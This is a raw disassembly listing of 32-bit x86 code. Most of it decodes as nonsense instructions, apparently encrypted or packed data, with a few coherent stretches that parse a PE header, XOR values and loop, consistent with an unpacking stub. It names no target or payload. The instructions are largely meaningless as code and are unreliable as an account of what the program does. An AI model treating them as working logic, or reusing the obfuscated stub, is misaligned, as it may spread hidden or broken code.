  40bda0:	rol    BYTE PTR [ecx-0x33],1
  40bda3:	and    al,0x17
  40bda5:	fadd   DWORD PTR [edx]
  40bda7:	call   0x29eaec3e
  40bdac:	out    0x4b,al
  40bdae:	and    ch,BYTE PTR [esi+0x3d]
  40bdb1:	lods   al,BYTE PTR ds:[esi]
  40bdb2:	dec    esi
  40bdb3:	leave  
  40bdb4:	inc    ebx
  40bdb5:	popf   
  40bdb6:	fmul   DWORD PTR [edi+esi*4-0x11]
  40bdba:	scas   al,BYTE PTR es:[edi]
  40bdbb:	mov    bh,0xc5
  40bdbd:	imul   esp,DWORD PTR [esp+esi*8-0x9],0xc787ccef
  40bdc5:	push   esi
  40bdc6:	mov    esi,eax
  40bdc8:	dec    eax
  40bdc9:	gs dec ebp
  40bdcb:	out    0xd8,eax
  40bdcd:	pusha  
  40bdce:	in     al,dx
  40bdcf:	out    dx,al
  40bdd0:	cmp    ah,ch
  40bdd2:	mov    ds:0x4f3c3570,eax
  40bdd7:	add    al,0x2b
  40bdd9:	inc    ecx
  40bdda:	mov    ebp,eax
  40bddc:	jnp    0x40bde9
  40bdde:	loop   0x40be59
  40bde0:	lock out 0xf1,al
  40bde3:	dec    ebp
  40bde4:	ret    
  40bde5:	lahf   
  40bde6:	nop
  40bde7:	cs sbb ebx,ebp
  40bdea:	sbb    dh,cl
  40bdec:	test   eax,0x7ab8a700
  40bdf1:	gs inc edx
  40bdf3:	mov    DWORD PTR [edi+0x14dbb1a1],ecx
  40bdf9:	daa    
  40bdfa:	(bad)  
  40bdfc:	mov    ?,WORD PTR [esi-0x8dee201]
  40be02:	jo     0x40be44
  40be04:	xlat   BYTE PTR ds:[ebx]
  40be05:	jb     0x40be54
  40be07:	or     DWORD PTR [esi+0x7b],edi
  40be0a:	out    0xcb,al
  40be0c:	(bad)
  40be0f:	mov    edi,0x895224c0
  40be14:	test   DWORD PTR [ecx-0x3e],ecx
  40be17:	lock add BYTE PTR [ecx+0x60],0x4a
  40be1c:	pop    ecx
  40be1d:	add    ch,BYTE PTR [ebp+0x5cb4d6e8]
  40be23:	jmp    0xcf849f6f
  40be28:	ret    0x4dde
  40be2b:	cwde   
  40be2c:	xchg   DWORD PTR [esi-0x3670bf51],esi
  40be32:	inc    ebp
  40be33:	xchg   DWORD PTR [ebx-0x79817b26],esi
  40be39:	test   eax,0xea7a5c8c
  40be3e:	pusha  
  40be3f:	out    dx,eax
  40be40:	(bad)  
  40be41:	bound  esi,QWORD PTR [esi+0x36562484]
  40be47:	dec    edx
  40be48:	cmp    BYTE PTR [esi-0x39],dl
  40be4b:	mov    al,BYTE PTR [eax]
  40be4d:	add    al,0x37
  40be4f:	and    DWORD PTR ds:0x432dde,0x432700
  40be59:	xor    al,0x47
  40be5b:	cmp    al,0xc3
  40be5d:	mov    DWORD PTR ds:0x432dd6,0x1383
  40be67:	jne    0x40c344
  40be6d:	mov    eax,DWORD PTR [ebp+0x8]
  40be70:	mov    ecx,DWORD PTR [ebp+0x8]
  40be73:	movzx  edx,BYTE PTR ds:0x434421
  40be7a:	xor    edx,DWORD PTR ds:0x434419
  40be80:	mov    DWORD PTR ds:0x434421,edx
  40be86:	add    ecx,DWORD PTR [eax+0x3c]
  40be89:	xor    eax,edx
  40be8b:	mov    edx,0x7510855
  40be90:	mov    DWORD PTR [ebp+0x8],ecx
  40be93:	or     ecx,0x72e5
  40be99:	mov    eax,DWORD PTR [ebp-0x4]
  40be9c:	and    DWORD PTR ds:0x434421,0x0
  40bea6:	mov    ecx,DWORD PTR ds:0x434421
  40beac:	inc    ecx
  40bead:	mov    DWORD PTR ds:0x434421,ecx
  40beb3:	cmp    DWORD PTR ds:0x434421,0x25
  40beba:	jne    0x40bed6
  40bec0:	push   0x432849
  40bec5:	push   DWORD PTR [ebp-0x24]
  40bec8:	push   0x7ea1
  40becd:	push   DWORD PTR [ebp-0x24]
  40bed0:	call   DWORD PTR ds:0x432d1a
  40bed6:	cmp    DWORD PTR ds:0x434421,0x17
  40bedd:	jb     0x40bea6
  40bee3:	xor    eax,edx
  40bee5:	push   esi
  40bee6:	jmp    0x40c101
  40beeb:	je     0x40befe
  40beed:	test   DWORD PTR [ebp+eiz*2+0x4df17194],eax
  40bef4:	pop    eax
  40bef5:	pop    esp
  40bef6:	or     al,BYTE PTR [ecx]
  40bef8:	stos   BYTE PTR es:[edi],al
  40bef9:	xchg   DWORD PTR [eax+0x7b],esi
  40befc:	cld    
  40befd:	jo     0x40bf6f
  40beff:	jb     0x40bf80
  40bf01:	jo     0x40bf73
  40bf03:	ficom  WORD PTR [esi-0x45]
  40bf06:	daa    
  40bf07:	mov    DWORD PTR ss:[ecx+0xd75af05],eax
  40bf0e:	dec    edi
  40bf0f:	ds dec edx
  40bf11:	jns    0x40bf2a
  40bf13:	std    
  40bf14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf15:	push   es
  40bf16:	hlt    
  40bf17:	pop    ebp
  40bf18:	jae    0x40bf58
  40bf1a:	mov    edx,0xdf8f5d1a
  40bf1f:	adc    ebx,DWORD PTR [ecx-0x53]
  40bf22:	inc    ebp
  40bf23:	push   esp
  40bf24:	sbb    eax,0xc425ad1c
  40bf29:	xor    edx,esi
  40bf2b:	nop
  40bf2c:	lock adc eax,0x577a3cef
  40bf32:	retf   0xed68
  40bf35:	mov    DWORD PTR [esi-0x40],eax
  40bf38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf39:	out    dx,eax
  40bf3a:	mov    bh,0x29
  40bf3c:	jbe    0x40bec0
  40bf3e:	cld    
  40bf3f:	or     eax,0xaf61fdf5
  40bf44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf45:	sub    al,0x5
  40bf47:	dec    esi
  40bf48:	pop    es
  40bf49:	pop    esi
  40bf4a:	cmp    al,0xf1
  40bf4c:	and    DWORD PTR [edx-0x37],ecx
  40bf4f:	iret   
  40bf50:	inc    esi
  40bf51:	xchg   BYTE PTR [esi+0x1a],dh
  40bf54:	xchg   edx,eax
  40bf55:	sbb    eax,esi
  40bf57:	lock jnp 0x40bef9
  40bf5a:	mov    dl,BYTE PTR [esi-0x4fc923ea]
  40bf60:	fcom   st(5)
  40bf62:	inc    esi
  40bf63:	loope  0x40bfcd
  40bf65:	ins    DWORD PTR es:[edi],dx
  40bf66:	es (bad) 
  40bf69:	xor    DWORD PTR [edi+0x4c],ecx
  40bf6c:	stos   BYTE PTR es:[edi],al
  40bf6d:	or     cl,ah
  40bf6f:	fdiv   st,st(0)
  40bf71:	loop   0x40bf2b
  40bf73:	les    eax,FWORD PTR [ebp+0x2d]
  40bf76:	adc    dl,al
  40bf78:	sub    eax,0xef4f5eb5
  40bf7d:	test   BYTE PTR [ecx],cl
  40bf7f:	outs   dx,DWORD PTR ds:[esi]
  40bf80:	jns    0x40bf5e
  40bf82:	or     bl,BYTE PTR [ebp-0x75]
  40bf85:	xor    al,0x38
  40bf87:	ja     0x40bf61
  40bf89:	rol    DWORD PTR ds:0xf79daf47,0xf9
  40bf90:	or     esi,DWORD PTR [ebx]
  40bf92:	mov    eax,0x9c6fe9f9
  40bf97:	mov    ds:0x50eba9bb,eax
  40bf9c:	pop    ss
  40bf9d:	leave  
  40bf9e:	push   edx
  40bf9f:	jmp    0xd097f0ed
  40bfa4:	adc    ecx,ebx
  40bfa6:	xor    BYTE PTR [ecx],bl
  40bfa8:	and    dl,dl
  40bfaa:	inc    ebp
  40bfab:	loopne 0x40c02b
  40bfad:	rcr    eax,0xff
  40bfb0:	add    DWORD PTR [esi-0x4b],0xd533c01b
  40bfb7:	fnsave ss:[esp+edx*8-0x2c]
  40bfbc:	push   ecx
  40bfbd:	mov    ebx,0x7b5a8ba5
  40bfc2:	or     BYTE PTR [edi-0x6e8a14aa],dl
  40bfc8:	daa    
  40bfc9:	out    dx,eax
  40bfca:	stc    
  40bfcb:	dec    esp
  40bfcc:	dec    ebx
  40bfcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bfcf:	push   0x1c
  40bfd1:	sbb    DWORD PTR [ebp+0x33417379],edi
  40bfd7:	inc    eax
  40bfd8:	icebp  
  40bfd9:	push   edi
  40bfda:	adc    BYTE PTR [ebp+edi*2-0x41],bl
  40bfde:	cs enter 0xe6a2,0x3f
  40bfe3:	push   ecx
  40bfe4:	shr    DWORD PTR [ebp-0x4b74d1cc],1
  40bfea:	inc    eax
  40bfeb:	xchg   BYTE PTR [edx-0x7f4f1ab8],al
  40bff1:	sub    ah,dh
  40bff3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bff4:	jmp    0x40bffe
  40bff6:	stos   DWORD PTR es:[edi],eax
  40bff7:	mov    esi,0x81832ff1
  40bffc:	jmp    0x40bfa2
  40bffe:	sub    eax,0xca457393
  40c003:	dec    esi
  40c004:	xor    al,0x60
  40c006:	fucom  st(3)
  40c008:	stc    
  40c009:	stos   DWORD PTR es:[edi],eax
  40c00a:	or     eax,0xb836a818
  40c00f:	xchg   ebp,eax
  40c010:	inc    eax
  40c011:	push   eax
  40c012:	scas   eax,DWORD PTR es:[edi]
  40c013:	pop    eax
  40c014:	adc    BYTE PTR [edi+0x4ffb85ad],0x76
  40c01b:	jecxz  0x40c07d
  40c01d:	movnti DWORD PTR [ebx+0x6a],edi
  40c021:	retf   
  40c022:	mov    eax,ds:0x350b2faf
  40c027:	iret   
  40c028:	pop    esi
  40c029:	aam    0x77
  40c02b:	add    esp,DWORD PTR [eax]
  40c02d:	mov    eax,0x2f8dc972
  40c032:	aaa    
  40c033:	mov    eax,0x145c51f
  40c038:	cmp    ah,al
  40c03a:	sahf   
  40c03b:	pop    ss
  40c03c:	ror    DWORD PTR [edx],cl
  40c03e:	or     al,0x20
  40c040:	xor    BYTE PTR [edx],bl
  40c042:	ret    0xc73a
  40c045:	ss mov ebx,0x72040319
  40c04b:	not    DWORD PTR [esi-0x54]
  40c04e:	pop    ebx
  40c04f:	pop    ecx
  40c050:	mov    ds:0x8da48087,eax
  40c055:	push   edx
  40c056:	repnz in eax,dx
  40c058:	cdq    
  40c059:	jl     0x40c06d
  40c05b:	ja     0x40c096
  40c05d:	cmp    al,0xb4
  40c05f:	push   es
  40c060:	fisub  WORD PTR [ebx-0x5d]
  40c063:	sub    BYTE PTR [esi-0x6e75eb4d],0xc7
  40c06a:	mov    edx,0xfd5fd4e8
  40c06f:	(bad)  
  40c070:	adc    eax,0xe820e939
  40c075:	mov    bh,0xb1
  40c077:	pop    esi
  40c078:	aad    0x71
  40c07a:	retf   
  40c07b:	sub    ebp,0x12
  40c07e:	int3   
  40c07f:	jge    0x40c004
  40c081:	dec    edx
  40c082:	or     esi,ebp
  40c084:	ins    DWORD PTR es:[edi],dx
  40c085:	data16 sub ah,BYTE PTR [esi]
  40c088:	cmp    al,0xc7
  40c08a:	addr16 mov al,ds:0x5a6b
  40c08e:	sbb    eax,0x70eca5ff
  40c093:	add    ch,al
  40c095:	aad    0x40
  40c097:	dec    esi
  40c098:	adc    dh,BYTE PTR [esi+0x25]
  40c09b:	lea    ebx,[ecx+ebx*1-0x401d8808]
  40c0a2:	in     eax,0xff
  40c0a4:	dec    eax
  40c0a6:	or     BYTE PTR [eax],ah
  40c0a8:	bound  esi,QWORD PTR [edx]
  40c0aa:	pop    esi
  40c0ab:	sub    cl,BYTE PTR [edi-0xfc022a8]
  40c0b1:	je     0x40c042
  40c0b3:	xchg   ebp,eax
  40c0b4:	fidivr WORD PTR [ebx]
  40c0b6:	dec    edi
  40c0b7:	push   ds
  40c0b8:	xor    esp,DWORD PTR [eax]
  40c0ba:	jmp    0xb6a1363c
  40c0bf:	neg    ebx
  40c0c1:	cmp    eax,0x61304cf7
  40c0c6:	sbb    BYTE PTR [edx+0x70],dl
  40c0c9:	mov    esi,0x253c3495
  40c0ce:	std    
  40c0cf:	mov    esi,DWORD PTR [ecx+0x48]
  40c0d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0d3:	push   edx
  40c0d4:	fs loopne 0x40c0c2
  40c0d7:	or     al,0xc4
  40c0d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0da:	mov    dl,BYTE PTR es:[ebx]
  40c0dd:	xor    eax,DWORD PTR gs:[ebx]
  40c0e0:	and    eax,0xd99f52df
  40c0e5:	enter  0x1e2,0x52
  40c0e9:	mov    edx,0xbed671a1
  40c0ee:	ss pop edi
  40c0f0:	pop    edx
  40c0f1:	gs jmp 0xf3760d1d
  40c0f7:	mov    bh,0xc0
  40c0f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0fa:	pop    eax
  40c0fb:	int    0x41
  40c0fd:	xchg   esi,eax
  40c0fe:	fcomi  st,st(6)
  40c100:	aaa    
  40c101:	mov    esi,DWORD PTR [ebp+0x8]
  40c104:	mov    ecx,0x32729c
  40c109:	add    eax,ecx
  40c10b:	jmp    0x40c326
  40c110:	cli    
  40c111:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c112:	push   ds
  40c113:	in     eax,0x21
  40c115:	gs inc ecx
  40c117:	arpl   WORD PTR [ebp*1+0x195e53b5],si
  40c11e:	pop    esi
  40c11f:	and    edi,DWORD PTR [ebp-0x6]
  40c122:	jo     0x40c194
  40c124:	jb     0x40c1a5
  40c126:	jo     0x40c198
  40c128:	clc    
  40c129:	jecxz  0x40c0b1
  40c12b:	out    0x19,eax
  40c12d:	mov    ds:0x27ac1ef1,al
  40c132:	add    esp,DWORD PTR [ecx+0x7b04be49]
  40c138:	sbb    al,BYTE PTR [edx+0x7a6c4b28]
  40c13e:	mov    es,WORD PTR ds:[ecx]
  40c141:	inc    eax
  40c142:	mov    ecx,DWORD PTR [ecx-0x55]
  40c145:	int3   
  40c146:	ja     0x40c1b9
  40c148:	cli    
  40c149:	sbb    eax,0x76cc73e6
  40c14e:	cwde   
  40c14f:	jmp    0xd6b2f1bb
  40c154:	mov    DWORD PTR [ebx+0x6da8ab3e],0x682ccf45
  40c15e:	xchg   BYTE PTR [ebx+0x1e],bh
  40c161:	xlat   BYTE PTR ds:[ebx]
  40c162:	inc    eax
  40c163:	cdq    
  40c164:	pushf  
  40c165:	in     eax,dx
  40c166:	xor    DWORD PTR [edx],edi
  40c168:	rol    esi,0x60
  40c16b:	inc    edx
  40c16c:	sar    edi,0x58
  40c16f:	stc    
  40c170:	jle    0x40c104
  40c172:	daa    
  40c173:	int    0xb3
  40c175:	aam    0x4f
  40c177:	inc    esp
  40c178:	xchg   ebx,eax
  40c179:	mov    dh,0xac
  40c17b:	(bad)  
  40c17c:	in     eax,0xc9
  40c17e:	xchg   edi,eax
  40c17f:	scas   al,BYTE PTR es:[edi]
  40c180:	ds dec esp
  40c182:	xchg   edx,eax
  40c183:	dec    ecx
  40c184:	cmp    DWORD PTR [eax-0x67bb302a],ebx
  40c18a:	inc    esi
  40c18b:	dec    esi
  40c18c:	aam    0xbb
  40c18e:	xor    al,0xea
  40c190:	test   al,0x4e
  40c192:	sti    
  40c193:	jge    0x40c156
  40c195:	mov    al,ds:0x5078806b
  40c19a:	mov    WORD PTR [ecx],?
  40c19c:	pop    es
  40c19d:	in     al,dx
  40c19e:	loopne 0x40c1c3
  40c1a0:	add    dl,dh
  40c1a2:	jmp    0x5d99216a
  40c1a7:	pop    ebp
  40c1a8:	cmc    
  40c1a9:	pop    edx
  40c1aa:	repz dec esi
  40c1ac:	pop    ds
  40c1ad:	mov    ds:0x13fded4f,al
  40c1b2:	xor    BYTE PTR [edx],al
  40c1b4:	jl     0x40c1b8
  40c1b6:	mov    bh,0xe3
  40c1b8:	and    BYTE PTR [edx],al
  40c1ba:	push   ecx
  40c1bb:	xor    edx,esi
  40c1bd:	xchg   BYTE PTR [ebx+0x147fc181],cl
  40c1c3:	push   ds
  40c1c4:	outs   dx,DWORD PTR ds:[esi]
  40c1c5:	mov    ah,0xfd
  40c1c7:	arpl   WORD PTR [edx],di
  40c1c9:	pop    es
  40c1ca:	and    eax,0xae2e2f39
  40c1cf:	xchg   BYTE PTR [ecx-0x45],bl
  40c1d2:	and    BYTE PTR [esi-0x231ce098],bl
  40c1d8:	mov    al,0x8c
  40c1da:	push   es
  40c1db:	lock aam 0x9a
  40c1de:	clc    
  40c1df:	mov    dh,0x94
  40c1e1:	sub    DWORD PTR [edx+0x257732a4],ecx
  40c1e7:	fistp  QWORD PTR [ecx+0x7beb6a4b]
  40c1ed:	mov    ds:0xb83f43e6,eax
  40c1f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1f3:	mov    BYTE PTR [edi-0x1ebd75cb],ch
  40c1f9:	retf   0x6f39
  40c1fc:	mov    BYTE PTR [edi-0x20],0x43
  40c200:	dec    ecx
  40c201:	sti    
  40c202:	(bad)  
  40c203:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c204:	jb     0x40c213
  40c206:	xor    al,0x83
  40c208:	nop
  40c209:	push   ss
  40c20a:	ins    DWORD PTR es:[edi],dx
  40c20b:	xchg   ecx,eax
  40c20c:	xchg   esp,eax
  40c20d:	loope  0x40c288
  40c20f:	inc    ebp
  40c210:	and    BYTE PTR [ecx],bh
  40c212:	outs   dx,DWORD PTR ds:[esi]
  40c213:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c214:	mov    ecx,0xe6b9a36c
  40c219:	scas   eax,DWORD PTR es:[edi]
  40c21a:	int    0xf5
  40c21c:	mov    al,0xe5
  40c21e:	sub    eax,0x318fc3ff
  40c223:	imul   esp,DWORD PTR [eax-0x68c3e047],0x32baa726
  40c22d:	xor    ah,BYTE PTR [edx-0x162e1e5f]
  40c233:	cmp    ebx,DWORD PTR [ecx+0x1b]
  40c236:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c237:	add    al,0x67
  40c239:	pop    ebp
  40c23a:	imul   ecx,ebx,0x9b0d44a5
  40c240:	jge    0x40c292
  40c242:	mov    DWORD PTR ds:0xcbe5411c,ecx
  40c248:	gs test eax,0xd9caa29
  40c24e:	cmc    
  40c24f:	fmul   QWORD PTR [eax+0x5]
  40c252:	xchg   esi,eax
  40c253:	inc    esp
  40c254:	pop    ss
  40c255:	fldenv [ebx]
  40c257:	pop    esp
  40c258:	out    0x2,al
  40c25a:	adc    bh,BYTE PTR [eax]
  40c25c:	aaa    
  40c25d:	xor    DWORD PTR [ebx+0x3745238a],esp
  40c263:	and    eax,0xdd01240a
  40c268:	mov    ds:0x8045a2ef,eax
  40c26d:	ss test eax,0x871cd55f
  40c273:	cmp    al,BYTE PTR [edx+0x138c7820]
  40c279:	xchg   esp,eax
  40c27a:	xchg   ecx,eax
  40c27b:	mov    es,WORD PTR [ebx-0x1d8d99a5]
  40c281:	sub    dh,BYTE PTR [ebx]
  40c283:	mov    ecx,0xcfeac281
  40c288:	mov    eax,0x30fb491b
  40c28d:	test   BYTE PTR [esi],ch
  40c28f:	mov    esi,0xafe6a659
  40c294:	fnstcw WORD PTR [edi]
  40c296:	loopne 0x40c22c
  40c298:	fiadd  DWORD PTR [edi+0x3eba7918]
  40c29e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c29f:	scas   eax,DWORD PTR es:[edi]
  40c2a0:	mov    ds,edx
  40c2a2:	fstp   TBYTE PTR [edi]
  40c2a4:	sahf   
  40c2a5:	rcl    DWORD PTR [ecx-0x5a6667bf],cl
  40c2ab:	inc    ecx
  40c2ac:	jo     0x40c2c0
  40c2ae:	sub    al,0xbc
  40c2b0:	lds    ebx,FWORD PTR [ecx+0x25bde82d]
  40c2b6:	out    0xc6,al
  40c2b8:	pop    ebx
  40c2b9:	fdiv   DWORD PTR [ebp+0x21]
  40c2bc:	add    edx,edx
  40c2be:	sti    
  40c2bf:	mov    ecx,0xdb0c1a65
  40c2c4:	into   
  40c2c5:	cmp    al,0xfd
  40c2c7:	popa   
  40c2c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2c9:	pop    es
  40c2ca:	retf   
  40c2cb:	in     eax,dx
  40c2cc:	test   DWORD PTR [ecx],ebx
  40c2ce:	xchg   ebx,eax
  40c2cf:	mov    ch,0xc3
  40c2d1:	xchg   ecx,eax
  40c2d2:	test   al,0x96
  40c2d4:	(bad)  
  40c2d5:	outs   dx,DWORD PTR ds:[esi]
  40c2d6:	out    dx,al
  40c2d7:	mov    dl,0x58
  40c2d9:	cmp    eax,0x1d2facae
  40c2de:	xlat   BYTE PTR ds:[ebx]
  40c2df:	adc    al,cl
  40c2e1:	icebp  
  40c2e2:	fmul   st(3),st
  40c2e4:	push   esi
  40c2e5:	daa    
  40c2e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2e7:	sti    
  40c2e8:	(bad)  
  40c2e9:	loopne 0x40c2ca
  40c2eb:	sub    al,bl
  40c2ed:	(bad)  
  40c2ee:	jmp    0xfcd3:0x70efe838
  40c2f5:	loope  0x40c355
  40c2f7:	push   0x5698b829
  40c2fc:	dec    esp
  40c2fd:	ins    DWORD PTR es:[edi],dx
  40c2fe:	dec    edi
  40c2ff:	fisttp QWORD PTR [esi-0x480abf86]
  40c305:	in     eax,0x91
  40c307:	dec    esp
  40c308:	sbb    BYTE PTR [ebp+0x6a],0x77
  40c30c:	jno    0x40c37d
  40c30e:	mov    dh,BYTE PTR [ebp+0x5c5e0318]
  40c314:	out    dx,eax
  40c315:	xchg   DWORD PTR [eax-0x7c2b1bfa],ebx
  40c31b:	sub    ch,cl
  40c31d:	ret    0x3f42
  40c320:	adc    eax,0xe99ea5cc
  40c325:	cmp    DWORD PTR [ecx],0xf5e5446
  40c32b:	test   BYTE PTR [eax],cl
  40c32d:	add    BYTE PTR [eax],al
  40c32f:	add    BYTE PTR [ebx+0x4fe90845],cl
  40c335:	add    al,0x0
  40c337:	add    BYTE PTR [ebx-0x3dcc03bb],cl
  40c33d:	add    eax,ecx
  40c33f:	jmp    0x40c787
  40c344:	mov    eax,DWORD PTR [ebp-0x4]
  40c347:	jmp    0x40c562
  40c34c:	or     eax,0x739e7462
  40c351:	scas   al,BYTE PTR es:[edi]
  40c352:	shl    DWORD PTR [ecx-0x41],1
  40c355:	jb     0x40c38a
  40c357:	loop   0x40c3d3
  40c359:	and    BYTE PTR [ecx-0x6c],0x7f
  40c35d:	clc    
  40c35e:	jo     0x40c3d0
  40c360:	jb     0x40c3e1
  40c362:	jo     0x40c3d4
  40c364:	jo     0x40c33c
  40c366:	loopne 0x40c334
  40c368:	std    
  40c369:	jnp    0x40c3b3
  40c36b:	cmp    eax,ebx
  40c36d:	in     al,0x8b
  40c36f:	xor    ecx,ebx
  40c371:	sub    edx,esp
  40c373:	cmp    BYTE PTR [eax],dh
  40c375:	mov    edx,esi
  40c377:	mov    bh,0x70
  40c379:	or     DWORD PTR [ebx-0x231cc24a],0x34
  40c380:	int    0x3b
  40c382:	mov    ebx,0xdb1f5d52
  40c387:	and    bh,BYTE PTR [ebx+0x1ecc6cf1]
  40c38d:	mov    al,0x38
  40c38f:	scas   eax,DWORD PTR es:[edi]
  40c390:	and    al,0x64
  40c392:	(bad)  
  40c393:	adc    ecx,ecx
  40c395:	aad    0x20
  40c397:	lock ret 
  40c399:	cmp    ebp,DWORD PTR [ebx+0x42]
  40c39c:	xchg   edi,eax
  40c39d:	les    edi,FWORD PTR [esi]
  40c39f:	popa   
  40c3a0:	gs mov dl,dl
  40c3a3:	nop
  40c3a4:	jne    0x40c3de
  40c3a6:	jmp    0x40c3ee
  40c3a8:	cld    
  40c3a9:	(bad)  
  40c3aa:	xchg   ebp,eax
  40c3ab:	retf   0xb5c3
  40c3ae:	jb     0x40c3c6
  40c3b0:	repz jno 0x40c411
  40c3b3:	in     eax,dx
  40c3b4:	or     dl,BYTE PTR [ebp+0x3c6732ae]
  40c3ba:	push   ds
  40c3bb:	(bad)  
  40c3bc:	xor    BYTE PTR [ebx+0x142dbbac],cl
  40c3c2:	add    ebx,DWORD PTR [eax-0x1c6ce89b]
  40c3c8:	mov    eax,0xc31809b
  40c3cd:	xchg   esi,eax
  40c3ce:	cwde   
  40c3cf:	dec    edx
  40c3d0:	dec    esi
  40c3d1:	test   BYTE PTR [eax+0x439970c5],dh
  40c3d7:	stos   BYTE PTR es:[edi],al
  40c3d8:	inc    ecx
  40c3d9:	adc    al,0x3d
  40c3db:	jns    0x40c36b
  40c3dd:	dec    ebx
  40c3de:	ficomp WORD PTR [edi-0xe]
  40c3e1:	fadd   st,st(7)
  40c3e3:	mov    ds:0xe5d404eb,al
  40c3e8:	or     eax,0x5eea8ef5
  40c3ed:	sub    esp,esp
  40c3ef:	adc    DWORD PTR [ebx+0x72],ecx
  40c3f2:	jo     0x40c3de
  40c3f4:	not    cl
  40c3f6:	sbb    BYTE PTR [ebx+0x65],0xf6
  40c3fa:	pushf  
  40c3fb:	rcr    DWORD PTR [esi-0x3797a1cc],cl
  40c401:	imul   edi,edx,0x39b3c336
  40c407:	test   DWORD PTR [eax+0x550f46e5],ebx
  40c40d:	popa   
  40c40e:	pop    esi
  40c40f:	int    0xb5
  40c411:	mov    al,0xd2
  40c413:	int3   
  40c414:	iret   
  40c415:	enter  0xc7b,0xfd
  40c419:	push   ecx
  40c41a:	pop    es
  40c41b:	adc    bh,BYTE PTR [eax-0x7a]
  40c41e:	xor    edi,DWORD PTR [edx-0x62ccbc0e]
  40c424:	adc    edx,DWORD PTR [eax-0x7e77bbca]
  40c42a:	fstp   TBYTE PTR [edi+0x3d3ffeb4]
  40c430:	(bad)  
  40c431:	mov    ebx,0x5842a1d6
  40c436:	xor    bh,ch
  40c438:	adc    al,0x89
  40c43a:	jg     0x40c455
  40c43c:	or     BYTE PTR [ebp+0x2a399bf1],ch
  40c442:	out    dx,eax
  40c443:	cmp    BYTE PTR [ecx-0x6b7e50b],al
  40c449:	jns    0x40c3e9
  40c44b:	das    
  40c44c:	jmp    0x40c3fd
  40c44e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c44f:	je     0x40c3f5
  40c451:	clc    
  40c452:	dec    esi
  40c453:	cmp    bx,si
  40c456:	sub    eax,0xd3c89430
  40c45b:	dec    edx
  40c45c:	mov    bl,0x65
  40c45e:	xchg   esp,eax
  40c45f:	jmp    0xbd7ef1d5
  40c464:	sbb    ah,bl
  40c466:	xchg   edx,eax
  40c467:	and    BYTE PTR [ebp-0xce970b8],bl
  40c46d:	adc    ecx,DWORD PTR [eax-0x45]
  40c470:	dec    ebx
  40c471:	mov    eax,0xfd7b4034
  40c476:	stos   BYTE PTR es:[edi],al
  40c477:	jmp    0xaf86b5f5
  40c47c:	push   ds
  40c47d:	outs   dx,DWORD PTR ds:[esi]
  40c47e:	pop    ebx
  40c47f:	cmp    ebp,ecx
  40c481:	mov    WORD PTR [esi+eax*4],fs
  40c484:	inc    ebp
  40c485:	test   BYTE PTR [eax+0x63b45f69],dl
  40c48b:	mov    DWORD PTR [ecx],0x3e6c7816
  40c491:	stos   BYTE PTR es:[edi],al
  40c492:	arpl   WORD PTR [esi+0x3d],si
  40c495:	jb     0x40c478
  40c497:	pop    ds
  40c498:	stc    
  40c499:	or     DWORD PTR [esi],0x2fd7ccdb
  40c49f:	test   al,0xf7
  40c4a1:	in     al,dx
  40c4a2:	inc    eax
  40c4a3:	aas    
  40c4a4:	call   0xbd0415bb
  40c4a9:	push   eax
  40c4aa:	jae    0x40c4f4
  40c4ac:	jp     0x40c464
  40c4ae:	or     DWORD PTR [ecx],0x3c50842f
  40c4b4:	aad    0x3b
  40c4b6:	out    dx,eax
  40c4b7:	mov    al,0x0
  40c4b9:	xchg   edx,eax
  40c4ba:	push   es
  40c4bb:	fisub  DWORD PTR [eax]
  40c4bd:	shl    BYTE PTR [ecx],cl
  40c4bf:	and    esi,edx
  40c4c1:	mov    ecx,0xb251ed8c
  40c4c6:	lods   eax,DWORD PTR ds:[esi]
  40c4c7:	fisttp QWORD PTR [eax-0x55]
  40c4ca:	jne    0x40c517
  40c4cc:	test   al,0xbe
  40c4ce:	mov    al,0x81
  40c4d0:	xchg   BYTE PTR [ebx+0x5a0944c9],dl
  40c4d6:	cmp    eax,0x507a8e6a
  40c4db:	jge    0x40c4ca
  40c4dd:	pushf  
  40c4de:	(bad)  
  40c4df:	or     DWORD PTR [ebx-0x43],0xa518065c
  40c4e6:	retf   
  40c4e7:	pop    ebx
  40c4e8:	arpl   WORD PTR [edi+ecx*4],bx
  40c4eb:	push   ecx
  40c4ec:	add    al,0xef
  40c4ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4ef:	sbb    ch,BYTE PTR es:[edi+eiz*2]
  40c4f3:	loop   0x40c48f
  40c4f5:	inc    eax
  40c4f6:	mov    bl,0x82
  40c4f8:	imul   esp,DWORD PTR [edx+eiz*2],0x17
  40c4fc:	stos   BYTE PTR es:[edi],al
  40c4fd:	pop    ds
  40c4fe:	adc    eax,0x1a2a4c30
  40c503:	pop    esp
  40c504:	int3   
  40c505:	test   al,0xa9
  40c507:	jnp    0x40c55c
  40c509:	cmp    BYTE PTR [ebx-0x2b],ch
  40c50c:	je     0x40c4c8
  40c50e:	add    ecx,DWORD PTR [esi]
  40c510:	dec    ecx
  40c511:	and    al,0x9c
  40c513:	jo     0x40c552
  40c515:	jb     0x40c552
  40c517:	or     DWORD PTR [eax-0xe],edx
  40c51a:	mov    eax,DWORD PTR [ebp+0x603c231c]
  40c520:	cmp    ebp,DWORD PTR [eax+esi*1]
  40c523:	loope  0x40c51f
  40c525:	jmp    0x40c510
  40c527:	cmc    
  40c528:	jle    0x40c4b7
